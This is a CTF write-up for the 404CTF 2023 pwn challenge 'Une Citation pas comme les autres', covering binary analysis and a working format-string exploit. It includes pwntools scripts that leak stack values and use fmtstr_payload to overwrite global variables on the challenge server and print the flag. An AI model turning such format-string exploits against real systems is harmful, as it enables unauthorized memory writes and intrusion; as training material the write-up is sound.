---
title: CTFs | 404CTF2023 | PWN | Une Citation
author: Kaiba_404
date: 2023-06-05
categories: [CTFs, 404CTF2023, PWN]
tags: [CTF, 404CTF2023, pwn]
permalink: /CTFs/404CTF2023/pwn/uneCitation1
---

# Une Citation pas comme les autres [1/2]


![citation_image](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/3b495da1-5e75-451e-adfb-e29bac5415e9)

> we should pay attention to the line `/bin n'est pas monté sur la machine à distance.` in the description. Because it is an important thing for us to avoid wasting time
{: .prompt-info}

We have only one file for this challenge [une_citation_pas_comme_les_autres_1_2](https://github.com/CongKhaiNGUYEN/congkhainguyen.github.io/tree/main/_posts/CTFs/404CTF2023/pwn/files/une_citation_pas_comme_les_autres_1_2).

To gather more information about the binary file, we can use the following commands:

`file une_citation_pas_comme_les_autres_1_2`: This command provides details about the file's format, architecture, and other relevant information. It helps identify the type of binary file you are dealing with.

`checksec une_citation_pas_comme_les_autres_1_2`: This command checks the security features enabled in the binary file, such as Address Space Layout Randomization (ASLR), Stack Canary, and other protections. It helps assess the level of security measures implemented in the binary.

By executing these commands and providing the name of the binary file, we can obtain more information about its format, security features, and potential vulnerabilities.

```shell
┌──(kali㉿kali)-[~]
└─$ file une_citation_pas_comme_les_autres_1_2 
une_citation_pas_comme_les_autres_1_2: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=8dc288d4fcf863f23a2d6094765775bb3c4330d3, for GNU/Linux 4.4.0, not stripped
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ checksec une_citation_pas_comme_les_autres_1_2 
[*] '~/une_citation_pas_comme_les_autres_1_2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

From the provided commands output, we can gather some interesting information about the file. It is identified as an "ELF 64-bit" file and it appears to be "not stripped". It's protected by `NX` (We can't run the shellcode by injecting it into the stack) and `Canary found` (That is to say that this file has canary in the stack when executing). `No PIE`  the binary does not have PIE enabled, and its base address is fixed at 0x400000.


Based on the information provided, it appears that certain exploitation methods can be eliminated based on the characteristics of the binary file:

**Ret2Lib (Return-to-Libc)**: This method relies on the presence of dynamic linking with a libc library. Since the binary is statically linked and does not have access to a libc library, the Ret2Lib technique is not applicable.

**Ret2Syscall (Return-to-Syscall)**: This method involves redirecting the execution flow to invoke specific system calls. However, if the binary does not allow for shell access, the Ret2Syscall technique cannot be used.

Considering these constraints, alternative exploitation techniques may need to be explored to exploit the vulnerability and progress further in the challenge.

## Analysis the binary file

Let's begin with Ghidra:

**Function main()**

![citation_main_1](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/8c9d56ee-09a1-4882-99cd-504547ea4100)

![citation_main_2](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/a3fa6bc2-9677-4f27-b5c6-ceec796eb1ab)


As the pictures show, main function gives us three choices and they will call three different functions. Let's look at the other functions that were called in main

**count_quote**

![count_quote](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/f6f402b5-bea3-4538-ad54-e123fe6436c2)

Based on the picture, it appears that the function is deliberately designed to be a joke! Instead of returning the number of quotes as expected, it simply returns a random number. 

**pick_quote**
![pick_quote](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/f9bdb6c5-6e5f-4d5f-9c17-c5051f066da9)

![num_quote_chosen_index](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/a3f66bc4-f9ee-4450-bac1-c24088fe453a)

This function performs the following steps:

1. Opens the file citations.txt.
2. Reads the content of the file line by line.
3. Checks the values of the variables chosen_index and num_quotes.0, which are located statically in the .bss segment of the program.
4. If num_quotes.0 is equal to 0, it enters a loop to count the number of citations inside citations.txt and stores the count in num_quotes.0.
5. If num_quotes.0 is greater than 0, it randomly selects chosen_index using the expression chosen_index = iVar1 % (num_quotes.0 - 1). Note that chosen_index cannot be equal to num_quotes.0 due to this line.
6. Based on the logic provided, it is inferred that the flag is located in the last line of the citations.txt file.

It seems that the function is responsible for reading and processing the contents of citations.txt, determining the number of citations, and selecting a random index to access one of the citations. If we don't do something 'unusual' we will never read the last line of the citations.txt file. This suggests to me that the flag is at the end of the file.


**write_quote**

![write_quotes_vuln](https://github.com/CongKhaiNGUYEN/CTF/assets/61443497/a94d75df-f729-4263-9e31-d072c8d87c01)

And voila, we have a format string vulnerability inside the write_quote function. But how can we using this vuln for getting the flag?

## Exploitation

### Get the necessary information to exploit the Format String vulnerability

I wrote a piece of code for this

```python
from pwn import *
# p = process("./une_citation_pas_comme_les_autres_1_2")
p = remote("challenges.404ctf.fr", 31719)

p.sendlineafter(b'>>> ',b'2')
p.recvuntil(b"[Vous] :")

p32_A = b"A"*32
p500_p = b" %p" * 100
p.sendline(p32_A + p500_p)
p.recvuntil(b': ')
result = str(p.recvline()).split(' ')
for i in range(len(result)):
	print("[" + str(i) + "]: " + result[i])
	
p.recvuntil(b'>>>')
p.close()
```

```shell
$ python3 fuzz.py
[+] Starting local process './une_citation_pas_comme_les_autres_1_2': pid 10245
[0]: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]: 0x7ffd3bf1ba80
[2]: (nil)
[3]: (nil)
[4]: 0xb7c72d
[5]: (nil)
[6]: 0x4141414141414141
[7]: 0x4141414141414141
[8]: 0x4141414141414141
[9]: 0x4141414141414141
[10]: 0x2520702520702520
[11]: 0x2070252070252070
[12]: 0x7025207025207025
[13]: 0x2520702520702520
[14]: 0x2070252070252070
[15]: 0x7025207025207025
[16]: 0x2520702520702520
[17]: 0x2070252070252070
[18]: 0x7025207025207025
[19]: 0x2520702520702520
[20]: 0x2070252070252070
[21]: 0x7025207025207025
[22]: 0x2520702520702520
[23]: 0x2070252070252070
[24]: 0x7025207025207025
[25]: 0x2520702520702520
[26]: 0x2070252070252070
[27]: 0x7025207025207025
[28]: 0x2520702520702520
[29]: 0x2070252070252070
[30]: 0x7025207025207025
[31]: 0x2520702520702520
[32]: 0x2070252070252070
[33]: 0x7025207025207025
[34]: 0x2520702520702520
[35]: 0x2070252070252070
[36]: 0x7025207025207025
[37]: 0x2520702520702520
[38]: 0x2070252070252070
[39]: 0x7025207025207025
[40]: 0x2520702520702520
[41]: 0x2070252070252070
[42]: 0x7025207025207025
[43]: 0x2520702520702520
[44]: 0x2070252070252070
[45]: 0x7025207025207025
[46]: 0x2520702520702520
[47]: 0xa70252070
[48]: 0x4
[49]: 0x4
[50]: 0x1
[51]: 0x416bb1
[52]: (nil)
[53]: 0x7ffd3bf1be50
[54]: 0x4
[55]: 0x7ffd3bf1bf00
[56]: 0x7ffd3bf1be80
[57]: 0x4bdf20
[58]: 0x1
[59]: 0x451193
[60]: 0x7ffd3bf1be50
[61]: 0x48f23d
[62]: 0x7ffd3bf1bf50
[63]: (nil)
[64]: 0x7ffd3bf1be50
[65]: 0x451284
[66]: 0x4bc3c0
[67]: 0x408fa9
[68]: (nil)
[69]: 0x476257
[70]: 0xb7bfe0
[71]: 0x68308f53
[72]: 0x7ffd3bf6e1a0
[73]: 0x7ffd3bf6e1c8
[74]: 0x7ffd3bf1be80
[75]: 0x7ffd3bf1be80
[76]: 0x7ffd3bf1bf00
[77]: 0x4
[78]: 0x4
[79]: 0x4bc3c0
[80]: 0x7ffd203e3e3e
[81]: (nil)
[82]: (nil)
[83]: 0x49222d
[84]: 0x7ffd3bf1c070
[85]: 0x7ffd3bf1bfe0
[86]: 0x7ffd3bf1bfd8
[87]: 0x1a0c23d
[88]: 0xb7c008
[89]: 0x1
[90]: (nil)
[91]: (nil)
[92]: (nil)
[93]: (nil)
[94]: (nil)
[95]: (nil)
[96]: (nil)
[97]: 0xa5710a40326cbb00
[98]: (nil)
[99]: 0x7ffd3bf1c228
[100]: 0x7ffd3bf1c218\n'
[*] Stopped process './une_citation_pas_comme_les_autres_1_2' (pid 10245)
```

As a result, we can see that the numbers 0x41 appear at the 6th position which says that we can control the value at these positions.

So when we use the function

`pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')→ str`

because offset(int) is the offset of the first formatter we control, so our command will be

`fmtstr_payload(6, writes, write_size='byte')` (`numbwritten` is optional)

### Attack Plan

The only function that lets us read the file now is the `pick_quote` function. So we need to exploit this function (make it behave erratically, of course). So how to make it act abnormally?

Upon closer examination of the file, it becomes evident that it lacks Position Independent Execution (PIE), and the variables num_quotes.0 and chosen_index are situated in the .bss section. This implies that we have the potential to manipulate these values using format strings!

Note that the `if` condition in the code only evaluates the cases where `num_quotes.0` is equal to 0 or greater than 0. This indicates that we have the ability to modify its value by using a negative number, represented in hexadecimal form. By determining the appropriate hexadecimal value, we can manipulate `chosen_index` and gain the flexibility to read quotes from any line in the citations.txt file.

```python
# write chosen_value (that we want), into chosen_index
payload2 = fmtstr_payload(6, {0x4be130:chosen_value}, write_size='int')

# write 0xffffffff (-1) into num_quotes.0
payload = fmtstr_payload(6, {0x4be134:0xffff},write_size='byte')
p.sendlineafter(b'>>> ',b'2')
p.recvuntil(b"[Vous] :")
p.sendline(payload)

payload = fmtstr_payload(6, {0x4be136:0xffff},write_size='byte')
p.sendlineafter(b'>>> ',b'2')
p.recvuntil(b"[Vous] :")
p.sendline(payload)

```

If we know the number of citations contained in the `citations.txt` file we can read directly from it, however this seems impossible. So I did it manually (when `chosen_index` has a value greater than the number of quotes in the file, the server will send an empty string) searching many times I found the number of quotes in the file is `0x139c4`

**The complete code:**

```python

from pwn import *
context.clear(arch='amd64',os='linux')
# p = process("./une_citation_pas_comme_les_autres_1_2")
p = remote("challenges.404ctf.fr", 31719)


###################################################################################

#  write chosen_value (0x139c4), into chosen_index
payload2 = fmtstr_payload(6, {0x4be130:0x139c4}, write_size='int')
p.sendlineafter(b'>>> ',b'1')
p.sendlineafter(b'>>> ',b'2')
p.recvuntil(b"[Vous] :")
p.sendline(payload2)

# write 0xffffffff (-1) into num_quotes.0
payload = fmtstr_payload(6, {0x4be134:0xffff},write_size='byte')
p.sendlineafter(b'>>> ',b'2')
p.recvuntil(b"[Vous] :")
p.sendline(payload)

payload = fmtstr_payload(6, {0x4be136:0xffff},write_size='byte')

p.sendlineafter(b'>>> ',b'2')
p.recvuntil(b"[Vous] :")
p.sendline(payload)

###################################################################################


p.sendlineafter(b'>>> ',b'1')

print(p.recv().decode())
p.close()


```
**Result**

```shell
$ python3 read_nom.py 
[+] Opening connection to challenges.404ctf.fr on port 31719: Done
404CTF{3H_813N!0U1_C357_M0N_V1C3.D3P141r3_357_M0N_P14151r.J41M3_QU0N_M3_H41553}

[*] Closed connection to challenges.404ctf.fr port 31719

```

**Flag:** `404CTF{3H_813N!0U1_C357_M0N_V1C3.D3P141r3_357_M0N_P14151r.J41M3_QU0N_M3_H41553}`